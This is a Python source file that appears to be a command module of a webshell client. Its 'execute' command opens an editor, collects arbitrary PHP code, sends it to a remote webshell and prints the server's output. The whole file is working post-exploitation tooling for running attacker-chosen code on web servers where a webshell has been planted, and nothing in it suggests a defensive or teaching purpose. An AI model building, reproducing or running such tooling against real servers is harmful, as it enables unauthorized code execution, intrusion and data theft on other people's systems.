from os import path, makedirs, remove
from uuid import uuid4
from libs.config import alias, color, gget
from libs.myapp import send, open_editor


@alias(True, func_alias="exec")
def run(editor: str = ""):
    """
    execute

    execute Custom PHP code by notepad / vi as default or your own editor.

    eg: execute {editor=""}
    """
    file_name = str(uuid4())
    file_path = gget("webshell.download_path", "webshell")
    if not path.exists(file_path):
        makedirs(file_path)
    real_file_path = path.join(file_path, file_name).replace("\\", "/")
    open(real_file_path, "a").close()
    open_editor(real_file_path, editor)
    with open(real_file_path, "r") as f:
        code = f.read().strip("<?php").strip("?>")
        print(color.yellow("Execute php code..."))
        res = send(code)
        if (not res):
            return
        text = res.r_text.strip()
        print(color.green("\nResult:\n") + text + "\n")
    remove(real_file_path)
